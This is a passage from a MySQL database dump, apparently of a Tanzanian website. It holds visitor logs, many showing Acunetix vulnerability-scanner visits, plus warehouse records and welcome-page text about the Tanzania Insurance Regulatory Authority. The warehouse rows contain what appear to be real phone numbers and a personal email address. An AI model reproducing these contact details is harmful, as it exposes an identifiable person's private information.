10.0','2022-08-11 10:52:52','2022-08-11 10:53:21'),(373,'251497760','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/43','Windows','NT 10.0','2022-08-11 10:55:13','2022-08-11 10:55:37'),(374,'72144414','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/44','Windows','NT 10.0','2022-08-11 10:56:04','2022-08-11 10:56:28'),(375,'3464801130','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/47','Windows','NT 10.0','2022-08-11 11:03:02','2022-08-11 11:03:30'),(376,'1553354130','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/48','Windows','NT 10.0','2022-08-11 11:04:17','2022-08-11 11:04:59'),(377,'3097017629','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/49','Windows','NT 10.0','2022-08-11 11:04:18','2022-08-11 11:04:55'),(378,'2104756197','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/50','Windows','NT 10.0','2022-08-11 11:05:05','2022-08-11 11:05:32'),(379,'3212738652','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/51','Windows','NT 10.0','2022-08-11 11:05:52','2022-08-11 11:06:24'),(380,'3343653781','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/52','Windows','NT 10.0','2022-08-11 11:05:58','2022-08-11 11:06:26'),(381,'3133966872','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/53','Windows','NT 10.0','2022-08-11 11:08:21','2022-08-11 11:09:01'),(382,'3558930235','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/54','Windows','NT 10.0','2022-08-11 11:09:21','2022-08-11 11:10:03'),(383,'2038424654','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/55','Windows','NT 10.0','2022-08-11 11:12:36','2022-08-11 11:13:07'),(384,'917028187','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/59','Windows','NT 10.0','2022-08-11 11:14:01','2022-08-11 11:14:24'),(385,'1365844444','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/61','Windows','NT 10.0','2022-08-11 11:14:33','2022-08-11 11:15:11'),(386,'1209535348','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/62','Windows','NT 10.0','2022-08-11 11:16:20','2022-08-11 11:16:45'),(387,'2072721157','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/63','Windows','NT 10.0','2022-08-11 11:17:08','2022-08-11 11:17:41'),(388,'2131865682','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/64','Windows','NT 10.0','2022-08-11 11:17:59','2022-08-11 11:18:22'),(389,'330694829','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/65','Windows','NT 10.0','2022-08-11 11:18:21','2022-08-11 11:18:44'),(390,'464016352','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/66','Windows','NT 10.0','2022-08-11 11:19:06','2022-08-11 11:19:31'),(391,'2122680272','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/67','Windows','NT 10.0','2022-08-11 11:19:57','2022-08-11 11:20:21'),(392,'8265435','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/68','Windows','NT 10.0','2022-08-11 11:21:09','2022-08-11 11:21:35'),(393,'4088606833','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/69','Windows','NT 10.0','2022-08-11 11:22:50','2022-08-11 11:23:14'),(394,'4293382024','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/70','Windows','NT 10.0','2022-08-11 11:23:38','2022-08-11 11:24:00'),(395,'2113661300','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/71','Windows','NT 10.0','2022-08-11 11:24:37','2022-08-11 11:24:37'),(396,'847554190','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/72','Windows','NT 10.0','2022-08-11 11:25:36','2022-08-11 11:25:36'),(397,'3088050409','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/73','Windows','NT 10.0','2022-08-11 11:25:40','2022-08-11 11:26:05'),(398,'3639133910','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/74','Windows','NT 10.0','2022-08-11 11:26:39','2022-08-11 11:27:03'),(399,'1236314085','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/75','Windows','NT 10.0','2022-08-11 11:27:29','2022-08-11 11:27:51'),(400,'461386819','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/77','Windows','NT 10.0','2022-08-11 11:29:44','2022-08-11 11:30:09'),(401,'495991380','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/78','Windows','NT 10.0','2022-08-11 11:30:59','2022-08-11 11:31:23'),(402,'35227176','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/79','Windows','NT 10.0','2022-08-11 11:31:50','2022-08-11 11:32:12'),(403,'900039079','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/83','Windows','NT 10.0','2022-08-11 11:33:52','2022-08-11 11:34:19'),(404,'2959953190','Firefox','103.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0','Windows','NT 10.0','2022-08-11 11:35:33','2022-08-11 11:35:33'),(405,'4204191790','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/84','Windows','NT 10.0','2022-08-11 11:39:13','2022-08-11 11:39:42'),(406,'644446751','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/87','Windows','NT 10.0','2022-08-11 11:41:14','2022-08-11 11:41:41'),(407,'1503365789','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/88','Windows','NT 10.0','2022-08-11 11:41:30','2022-08-11 11:41:59'),(408,'994804356','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/93','Windows','NT 10.0','2022-08-11 11:42:33','2022-08-11 11:42:56'),(409,'387346631','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/94','Windows','NT 10.0','2022-08-11 11:45:35','2022-08-11 11:46:02'),(410,'2683543959','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/98','Windows','NT 10.0','2022-08-11 12:24:16','2022-08-11 12:24:42'),(411,'3744279629','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/99','Windows','NT 10.0','2022-08-11 12:28:04','2022-08-11 12:28:30'),(412,'2710335898','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/102','Windows','NT 10.0','2022-08-11 12:38:53','2022-08-11 12:39:18'),(413,'1149146026','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/103','Windows','NT 10.0','2022-08-11 12:42:13','2022-08-11 12:42:36'),(414,'248172331','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/104','Windows','NT 10.0','2022-08-11 12:45:29','2022-08-11 12:45:54'),(415,'1521514829','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/105','Windows','NT 10.0','2022-08-11 12:47:38','2022-08-11 12:48:00'),(416,'1259961029','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/110','Windows','NT 10.0','2022-08-11 13:54:15','2022-08-11 13:54:37'),(417,'838932205','Firefox','103.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0','Ubuntu',NULL,'2022-08-11 14:26:56','2022-08-11 14:28:08'),(418,'1258507126','Firefox','103.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0','Windows','NT 10.0','2022-08-11 15:22:46','2022-08-11 15:22:46'),(419,'648137169','Chrome','103.0.0.0','Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Android','11','2022-08-12 01:20:58','2022-08-12 01:21:21'),(420,'3504996044','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-12 06:40:43','2022-08-12 06:41:07'),(421,'3848503492','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-12 06:42:27','2022-08-12 07:49:28'),(422,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-12 07:42:47','2022-08-12 12:53:53'),(423,'490463053','Firefox','103.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0','Windows','NT 10.0','2022-08-12 07:56:15','2022-08-12 07:56:15'),(424,'1496952862','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-12 08:13:17','2022-08-12 19:40:01'),(425,'2621325573','Firefox','103.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0','Windows','NT 10.0','2022-08-12 08:47:46','2022-08-12 08:47:46'),(426,'838932205','Firefox','103.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0','Ubuntu',NULL,'2022-08-12 09:33:46','2022-08-12 12:12:40'),(427,'1341174949','Chrome','104.0.5112.79','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36','Linux','x86_64','2022-08-12 11:37:31','2022-08-12 12:52:27'),(428,'1496952862','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-13 05:52:14','2022-08-13 20:31:29'),(429,'2871237589','Chrome','104.0.5112.88','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.88 Mobile/15E148 Safari/604.1','iOS','15.4','2022-08-13 15:08:18','2022-08-13 17:07:29'),(430,'2556072706','Firefox','103.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0','Windows','NT 10.0','2022-08-13 15:12:21','2022-08-13 15:13:51'),(431,'2109889436','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-13 18:58:29','2022-08-13 20:57:26'),(432,'1496952862','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-13 21:00:15','2022-08-14 06:12:44'),(433,'2109889436','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-13 21:09:41','2022-08-14 07:38:36'),(434,'3204299490','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-14 09:04:16','2022-08-14 09:14:05'),(435,'3041550241','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-14 12:58:26','2022-08-14 12:58:26');
/*!40000 ALTER TABLE `visitors_logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `warehouses`
--

DROP TABLE IF EXISTS `warehouses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `warehouses` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `warehouses`
--

LOCK TABLES `warehouses` WRITE;
/*!40000 ALTER TABLE `warehouses` DISABLE KEYS */;
INSERT INTO `warehouses` VALUES (1,'Mnazi juuu kusini','0692261066','engotheta@gmail.com','Dar es salaam, Kurasini',1,'mnazi-juuu-kusini','2022-06-30 20:47:08','2022-06-30 20:47:08'),(2,'Northen high way','069226104','engotheta@gmail.com','Iringa, Kaskazin',1,'mnazi-juuu-kusini','2022-06-30 20:47:08','2022-06-30 20:47:08'),(3,'Ilemela temeke','0692261066','engotheta@gmail.com','Dar es salaam, Kurasini',1,'mnazi-juuu-kusini','2022-06-30 20:47:08','2022-06-30 20:47:08'),(4,'Mbeya soweto','069226104','engotheta@gmail.com','Iringa, Kaskazin',1,'mnazi-juuu-kusini','2022-06-30 20:47:08','2022-06-30 20:47:08');
/*!40000 ALTER TABLE `warehouses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `welcome`
--

DROP TABLE IF EXISTS `welcome`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `welcome` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `summary_en` text,
  `summary_sw` text,
  `content_sw` text,
  `content_en` text,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `welcome`
--

LOCK TABLES `welcome` WRITE;
/*!40000 ALTER TABLE `welcome` DISABLE KEYS */;
INSERT INTO `welcome` VALUES (2,NULL,NULL,'<p>TIRA is established under the the Insurance Act No.10 of 2009 as Follows:-</p>\r\n\r\n<ul>\r\n	<li>There is established a body to be known as the Tanzania Insurance Regulatory Authority.</li>\r\n	<li>Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic.</li>\r\n	<li>The&nbsp; Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a) Capable of suing and being sued;<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (b) Capable of borrowing money,acquiring and disposing of property ;and<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (c) Capable of doing all other things which a body corporate may lawful do.</li>\r\n</ul>','<p>TIRA is established under the the Insurance Act No.10 of 2009 as Follows:-</p>\r\n\r\n<ul>\r\n	<li>There is established a body to be known as the Tanzania Insurance Regulatory Authority.</li>\r\n	<li>Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic.</li>\r\n	<li>The&nbsp; Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a) Capable of suing and being sued;<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (b) Capable of borrowing money,acquiring and disposing of property ;and<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (c) Capable of doing all other things which a body corporate may lawful do.</li>\r\n</ul>',1,'2022-08-07 16:13:16','2022-08-07 13:13:16');
/*!40000 ALTER TABLE `welcome` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-08-14 16:15:09